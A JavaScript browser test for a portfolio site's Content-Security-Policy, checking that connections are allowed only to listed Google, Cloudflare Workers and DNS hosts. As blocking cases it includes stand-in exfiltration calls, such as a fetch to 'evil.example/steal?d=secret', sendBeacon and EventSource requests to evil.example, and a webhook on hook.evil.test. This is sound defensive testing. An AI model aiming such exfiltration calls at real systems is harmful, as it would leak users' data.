// S2-C2: the REAL <meta> Content-Security-Policy of index.html is enforced by the browser here (the harness serves the file unchanged).
import { b, check, errs, fresh, signIn, results, srv } from './w5-harness.mjs';
const { ctx, pg } = await fresh();
const ok = h => ({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: '{"Answer":[{"type":1,"data":"185.199.108.153"},{"type":1,"data":"185.199.109.153"},{"type":1,"data":"185.199.110.153"},{"type":1,"data":"185.199.111.153"}],"reply":"HOOK-REPLY"}' });
const hits = [], served = []; pg.on('request', r => hits.push(r.url()));
// every ALLOWED host answers; the evil ones also would, so only the browser rule can stop them
await ctx.route(/firestore\.googleapis\.com|identitytoolkit\.googleapis\.com|securetoken\.googleapis\.com|portfolio-forms\.fredespinosa86-app\.workers\.dev|www\.googleapis\.com|script\.google\.com|script\.googleusercontent\.com|www\.youtube\.com\/oembed|dns\.google|evil\.example|hook\.evil\.test|example\.com/, r => { served.push(r.request().url()); r.fulfill(ok()); });
await pg.evaluate(() => { window.__viol = []; document.addEventListener('securitypolicyviolation', e => window.__viol.push(e.effectiveDirective + ' ' + e.blockedURI)); });
const tryFetch = u => pg.evaluate(async u => { try { const r = await fetch(u); return r.ok ? 'ok' : 'status ' + r.status; } catch (e) { return 'blocked'; } }, u);

// ---- 1. the policy in the page is the tight one
const pol = await pg.evaluate(() => window.coreCsp.parse(window.coreCsp.metaText()));
const conn = pol['connect-src'];
check('connect-src in the page is self + 9 named hosts, no https:', conn[0] === "'self'" && conn.length === 10 && !conn.includes('https:') && !conn.includes('*'), conn.join(' '));
check('the other directives are unchanged by this phase (img-src and media-src are tightened and tested in s2c3-1)', pol['object-src'][0] === "'none'" && pol['default-src'][0] === "'self'" && pol['form-action'][0] === "'self'");

// ---- 2. allowed hosts work, others are blocked by the browser itself
const allowed = ['https://firestore.googleapis.com/v1/x', 'https://identitytoolkit.googleapis.com/v1/x', 'https://securetoken.googleapis.com/v1/x', 'https://portfolio-forms.fredespinosa86-app.workers.dev/status',
  'https://www.googleapis.com/calendar/v3/freeBusy', 'https://script.google.com/macros/s/AAAA/exec', 'https://script.googleusercontent.com/macros/echo', 'https://www.youtube.com/oembed?format=json', 'https://dns.google/resolve?name=a'];
for (const u of allowed) check('allowed: ' + new URL(u).host, await tryFetch(u) === 'ok', await tryFetch(u));
check('allowed: same-origin request', await pg.evaluate(async () => { try { return (await fetch(location.pathname, { method: 'HEAD' })).ok; } catch (e) { return false; } }));
const evil = ['https://evil.example/steal?d=secret', 'https://firestore.googleapis.com.evil.example/x', 'https://evilfirestore.googleapis.com/x', 'https://accounts.google.com/x', 'https://www.google.com/x', 'https://workers.dev/x',
  'https://other.workers.dev/x', 'https://example.com/index.html', 'http://dns.google/resolve', 'https://dns.google:8443/resolve'];
for (const u of evil) check('blocked: ' + u.replace(/\?.*/, ''), await tryFetch(u) === 'blocked');
check('the browser reported every block, with the directive', await pg.evaluate(n => window.__viol.length >= n && window.__viol.every(v => v.startsWith('connect-src')), evil.length), JSON.stringify(await pg.evaluate(() => window.__viol)));
check('no request to a blocked host was ever served (the browser stopped each one first)', !served.some(u => /evil\.example|evilfirestore|other\.workers\.dev|example\.com\/index|accounts\.google|www\.google\.com|http:\/\/dns|:8443/.test(u)), served.filter(u => /evil|example|8443|accounts|www\.google\.com\//.test(u)).join(' '));
served.length = 0; await pg.evaluate(() => { window.__viol.length = 0; });
await pg.evaluate(async () => { navigator.sendBeacon('https://evil.example/b', 'x'); try { const e = new EventSource('https://evil.example/s'); await new Promise(r => { e.onerror = r; setTimeout(r, 600); }); e.close(); } catch (x) { /* blocked */ } await new Promise(r => setTimeout(r, 300)); });
check('other kinds of connections are blocked too: beacon and EventSource', !served.some(u => /evil\.example\/(b|s)/.test(u)) && (await pg.evaluate(() => window.__viol.filter(v => /connect-src https:\/\/evil\.example/.test(v)).length)) >= 2, JSON.stringify(await pg.evaluate(() => window.__viol)) + hits.join(' '));

// ---- 3. chat webhook: a host that is not on the list is skipped quietly; scripted answers still work
const chat = async (q, wait) => { await pg.evaluate(() => { const b = document.getElementById('chatBtn'); if (document.getElementById('chat').hidden || !document.getElementById('chat').classList.contains('open')) b.click(); }); await pg.fill('#chatInput', q); const n = await pg.$$eval('#msgs .m.bot', e => e.length); await pg.press('#chatInput', 'Enter'); await pg.waitForFunction(n => document.querySelectorAll('#msgs .m.bot:not(.typing)').length > n, n, { timeout: 15000 }); return pg.$$eval('#msgs .m.bot:not(.typing)', e => e[e.length - 1].textContent); };
hits.length = 0; await pg.evaluate(() => { window.chatHook = 'https://hook.evil.test/webhook'; window.__viol.length = 0; });
check('coreCsp says the unlisted webhook is not allowed', await pg.evaluate(() => window.coreCsp.allowsConnect(window.chatHook)) === false);
const a1 = await chat('zzqx plorp unknown question');
check('unlisted webhook: scripted answer is shown', a1.length > 10 && !/HOOK-REPLY/.test(a1), a1);
check('unlisted webhook: the page does not even try it (no request, no violation, no console error)', !hits.some(u => /hook\.evil\.test/.test(u)) && !served.some(u => /hook\.evil/.test(u)) && (await pg.evaluate(() => window.__viol.length)) === 0 && errs.length === 0, hits.join(' ') + JSON.stringify(errs));
await pg.evaluate(() => { window.chatHook = 'https://portfolio-forms.fredespinosa86-app.workers.dev/hook'; });
check('a listed webhook host is allowed by the helper', await pg.evaluate(() => window.coreCsp.allowsConnect(window.chatHook)) === true);
const a2 = await chat('zzqx another unknown question');
check('listed webhook host: it is called and its reply shown', /HOOK-REPLY/.test(a2) && hits.some(u => /workers\.dev\/hook/.test(u)), a2);

// ---- 4. custom-domain check: DNS lookup yes, fetching the visitor-typed domain no; an "open in new tab" link instead
await signIn(pg); await pg.waitForTimeout(400); await pg.click('#dashOpen'); await pg.waitForTimeout(300); await pg.click('.dnav [data-page=domain]'); await pg.waitForTimeout(300);
await pg.fill('#dmName', 'example.com'); await pg.click('#dmSave'); await pg.waitForTimeout(400);
hits.length = 0; await pg.evaluate(() => { window.__viol.length = 0; }); await pg.click('#dmVerify'); await pg.waitForTimeout(800);
const checks = await pg.textContent('#dmChecks');
check('verify: the DNS check ran against dns.google', hits.some(u => /dns\.google\/resolve\?name=example\.com&type=A/.test(u)) && /DNS: A records point to GitHub Pages/.test(checks), checks);
check('verify: the domain itself is NOT fetched, so the browser has nothing to block', !hits.some(u => /^https:\/\/example\.com/.test(u)) && (await pg.evaluate(() => window.__viol.length)) === 0, hits.join(' '));
const link = await pg.$eval('#dmChecks a', a => ({ href: a.href, target: a.target, rel: a.rel })).catch(() => null);
check('verify: an "open in a new tab" link replaces the HTTPS fetch', link && link.href === 'https://example.com/' && link.target === '_blank' && /noopener/.test(link.rel) && /lock icon/.test(checks), JSON.stringify(link));
check('verify: status is saved after the DNS check only', (await pg.evaluate(() => window.__store['ownerPrivate/config'])).domainStatus === 'verified');
check('page errors: ' + JSON.stringify(errs), errs.length === 0);
const bad = results.filter(r => !r[1]).length; console.log(bad ? 'SOME FAILED' : 'ALL PASSED');
await b.close(); srv.close();
